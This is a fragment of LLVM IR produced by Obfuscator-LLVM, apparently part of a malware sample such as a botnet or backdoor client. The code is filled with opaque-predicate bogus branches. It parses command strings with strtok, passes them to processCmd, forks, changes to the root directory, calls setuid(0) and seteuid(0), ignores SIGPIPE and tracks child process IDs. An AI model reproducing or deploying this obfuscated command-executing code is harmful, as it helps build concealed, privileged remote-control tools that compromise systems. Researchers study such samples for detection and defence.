  %544 = add i64 %543, 1
  call void @llvm.memset.p0i8.i64(i8* %541, i8 0, i64 %544, i32 1, i1 false)
  %545 = load i32, i32* %20, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %546
  %548 = load i8*, i8** %547, align 8
  %549 = load i8*, i8** %21, align 8
  %550 = call i8* @strcpy(i8* %548, i8* %549) #2
  %551 = load i32, i32* %20, align 4
  %552 = add nsw i32 %551, 1
  store i32 %552, i32* %20, align 4
  br label %553

; <label>:553:                                    ; preds = %530, %originalBBpart269
  %554 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0)) #2
  store i8* %554, i8** %21, align 8
  br label %506

; <label>:555:                                    ; preds = %506
  %556 = load i32, i32* @x.79
  %557 = load i32, i32* @y.80
  %558 = sub i32 %556, 1
  %559 = mul i32 %556, %558
  %560 = urem i32 %559, 2
  %561 = icmp eq i32 %560, 0
  %562 = icmp slt i32 %557, 10
  %563 = or i1 %561, %562
  br i1 %563, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %555
  %564 = load i32, i32* %20, align 4
  %565 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %564, i8** %565)
  %566 = load i32, i32* %20, align 4
  %567 = icmp sgt i32 %566, 1
  %568 = load i32, i32* @x.79
  %569 = load i32, i32* @y.80
  %570 = sub i32 %568, 1
  %571 = mul i32 %568, %570
  %572 = urem i32 %571, 2
  %573 = icmp eq i32 %572, 0
  %574 = icmp slt i32 %569, 10
  %575 = or i1 %573, %574
  br i1 %575, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br i1 %567, label %576, label %638

; <label>:576:                                    ; preds = %originalBBpart273
  %577 = load i32, i32* @x.79
  %578 = load i32, i32* @y.80
  %579 = sub i32 %577, 1
  %580 = mul i32 %577, %579
  %581 = urem i32 %580, 2
  %582 = icmp eq i32 %581, 0
  %583 = icmp slt i32 %578, 10
  %584 = or i1 %582, %583
  br i1 %584, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %576
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  %585 = load i32, i32* @x.79
  %586 = load i32, i32* @y.80
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %593

; <label>:593:                                    ; preds = %originalBBpart288, %originalBBpart277
  %594 = load i32, i32* @x.79
  %595 = load i32, i32* @y.80
  %596 = sub i32 %594, 1
  %597 = mul i32 %594, %596
  %598 = urem i32 %597, 2
  %599 = icmp eq i32 %598, 0
  %600 = icmp slt i32 %595, 10
  %601 = or i1 %599, %600
  br i1 %601, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %593
  %602 = load i32, i32* %22, align 4
  %603 = load i32, i32* %20, align 4
  %604 = icmp slt i32 %602, %603
  %605 = load i32, i32* @x.79
  %606 = load i32, i32* @y.80
  %607 = sub i32 %605, 1
  %608 = mul i32 %605, %607
  %609 = urem i32 %608, 2
  %610 = icmp eq i32 %609, 0
  %611 = icmp slt i32 %606, 10
  %612 = or i1 %610, %611
  br i1 %612, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br i1 %604, label %613, label %637

; <label>:613:                                    ; preds = %originalBBpart281
  %614 = load i32, i32* %22, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %615
  %617 = load i8*, i8** %616, align 8
  call void @free(i8* %617) #2
  br label %618

; <label>:618:                                    ; preds = %613
  %619 = load i32, i32* @x.79
  %620 = load i32, i32* @y.80
  %621 = sub i32 %619, 1
  %622 = mul i32 %619, %621
  %623 = urem i32 %622, 2
  %624 = icmp eq i32 %623, 0
  %625 = icmp slt i32 %620, 10
  %626 = or i1 %624, %625
  br i1 %626, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %618
  %627 = load i32, i32* %22, align 4
  %628 = add nsw i32 %627, 1
  store i32 %628, i32* %22, align 4
  %629 = load i32, i32* @x.79
  %630 = load i32, i32* @y.80
  %631 = sub i32 %629, 1
  %632 = mul i32 %629, %631
  %633 = urem i32 %632, 2
  %634 = icmp eq i32 %633, 0
  %635 = icmp slt i32 %630, 10
  %636 = or i1 %634, %635
  br i1 %636, label %originalBBpart288, label %originalBB83alteredBB

originalBBpart288:                                ; preds = %originalBB83
  br label %593

; <label>:637:                                    ; preds = %originalBBpart281
  br label %638

; <label>:638:                                    ; preds = %637, %originalBBpart273
  %639 = load i32, i32* @x.79
  %640 = load i32, i32* @y.80
  %641 = sub i32 %639, 1
  %642 = mul i32 %639, %641
  %643 = urem i32 %642, 2
  %644 = icmp eq i32 %643, 0
  %645 = icmp slt i32 %640, 10
  %646 = or i1 %644, %645
  br i1 %646, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %638
  %647 = load i32, i32* @x.79
  %648 = load i32, i32* @y.80
  %649 = sub i32 %647, 1
  %650 = mul i32 %647, %649
  %651 = urem i32 %650, 2
  %652 = icmp eq i32 %651, 0
  %653 = icmp slt i32 %648, 10
  %654 = or i1 %652, %653
  br i1 %654, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %655

; <label>:655:                                    ; preds = %originalBBpart292, %originalBBpart237
  br label %129

; <label>:656:                                    ; preds = %129
  %657 = load i32, i32* @x.79
  %658 = load i32, i32* @y.80
  %659 = sub i32 %657, 1
  %660 = mul i32 %657, %659
  %661 = urem i32 %660, 2
  %662 = icmp eq i32 %661, 0
  %663 = icmp slt i32 %658, 10
  %664 = or i1 %662, %663
  br i1 %664, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %656
  %665 = load i32, i32* @x.79
  %666 = load i32, i32* @y.80
  %667 = sub i32 %665, 1
  %668 = mul i32 %665, %667
  %669 = urem i32 %668, 2
  %670 = icmp eq i32 %669, 0
  %671 = icmp slt i32 %666, 10
  %672 = or i1 %670, %671
  br i1 %672, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %673

; <label>:673:                                    ; preds = %originalBBpart296, %100
  ret i32 0

originalBBalteredBB:                              ; preds = %originalBB, %50
  %674 = call i32 @fork() #2
  store i32 %674, i32* %8, align 4
  %675 = icmp ne i32 %674, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %79
  %676 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i32 0, i32 0)) #2
  %677 = call i32 @setuid(i32 0) #2
  %678 = call i32 @seteuid(i32 0) #2
  %679 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %106
  %680 = call i32 @sleep(i32 5)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %151
  %681 = load i32, i32* %14, align 4
  %682 = zext i32 %681 to i64
  %683 = load i64, i64* @numpids, align 8
  %684 = icmp ult i64 %682, %683
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %172
  %685 = load i32*, i32** @pids, align 8
  %686 = load i32, i32* %14, align 4
  %687 = zext i32 %686 to i64
  %688 = getelementptr inbounds i32, i32* %685, i64 %687
  %689 = load i32, i32* %688, align 4
  %690 = load i32*, i32** @pids, align 8
  %691 = load i32, i32* %14, align 4
  %_ = shl i32 %691, 1
  %_15 = sub i32 %691, 1
  %gen = mul i32 %_15, 1
  %_16 = sub i32 %691, 1
  %gen17 = mul i32 %_16, 1
  %_18 = sub i32 0, %691
  %gen19 = add i32 %_18, 1
  %692 = sub i32 %691, 1
  %693 = zext i32 %692 to i64
  %694 = getelementptr inbounds i32, i32* %690, i64 %693
  store i32 %689, i32* %694, align 4
  br label %originalBB14

originalBB23alteredBB:                            ; preds = %originalBB23, %241
  %695 = load i32, i32* %11, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %696
  store i8 0, i8* %697, align 1
  %698 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %698)
  %699 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %700 = call i8* @strstr(i8* %699, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0)) #10
  %701 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %702 = icmp eq i8* %700, %701
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %266
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %288
  call void @exit(i32 0) #14
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %305
  %703 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %703, i8** %15, align 8
  %704 = load i8*, i8** %15, align 8
  %705 = load i8, i8* %704, align 1
  %706 = zext i8 %705 to i32
  %707 = icmp eq i32 %706, 33
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %342
  %708 = load i8*, i8** %16, align 8
  %709 = getelementptr inbounds i8, i8* %708, i32 1
  store i8* %709, i8** %16, align 8
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %366
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %401
  %710 = load i8*, i8** %15, align 8
  %711 = load i8*, i8** %15, align 8
  %712 = call i64 @strlen(i8* %711) #10
  %_48 = shl i64 %712, 1
  %_49 = shl i64 %712, 1
  %_50 = sub i64 %712, 1
  %gen51 = mul i64 %_50, 1
  %_52 = shl i64 %712, 1
  %_53 = shl i64 %712, 1
  %_54 = shl i64 %712, 1
  %_55 = shl i64 %712, 1
  %713 = sub i64 %712, 1
  %714 = getelementptr inbounds i8, i8* %710, i64 %713
  %715 = load i8, i8* %714, align 1
  %716 = zext i8 %715 to i32
  %717 = icmp eq i32 %716, 13
  br label %originalBB47

originalBB59alteredBB:                            ; preds = %originalBB59, %446
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %476
  %718 = load i8*, i8** %18, align 8
  %719 = load i8, i8* %718, align 1
  %720 = zext i8 %719 to i32
  %721 = call i32 @toupper(i32 %720) #10
  %722 = trunc i32 %721 to i8
  %723 = load i8*, i8** %18, align 8
  store i8 %722, i8* %723, align 1
  %724 = load i8*, i8** %18, align 8
  %725 = getelementptr inbounds i8, i8* %724, i32 1
  store i8* %725, i8** %18, align 8
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %509
  %726 = load i8*, i8** %21, align 8
  %727 = load i8, i8* %726, align 1
  %728 = zext i8 %727 to i32
  %729 = icmp ne i32 %728, 10
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %555
  %730 = load i32, i32* %20, align 4
  %731 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %730, i8** %731)
  %732 = load i32, i32* %20, align 4
  %733 = icmp sgt i32 %732, 1
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %576
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %593
  %734 = load i32, i32* %22, align 4
  %735 = load i32, i32* %20, align 4
  %736 = icmp slt i32 %734, %735
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %618
  %737 = load i32, i32* %22, align 4
  %_84 = sub i32 0, %737
  %gen85 = add i32 %_84, 1
  %_86 = shl i32 %737, 1
  %738 = add nsw i32 %737, 1
  store i32 %738, i32* %22, align 4
  br label %originalBB83

originalBB90alteredBB:                            ; preds = %originalBB90, %638
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %656
  br label %originalBB94
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare i32 @setuid(i32) #4

; Function Attrs: nounwind
declare i32 @seteuid(i32) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146710168}
!2 = !{i32 -2146709460}
!3 = !{i32 -2146708763}
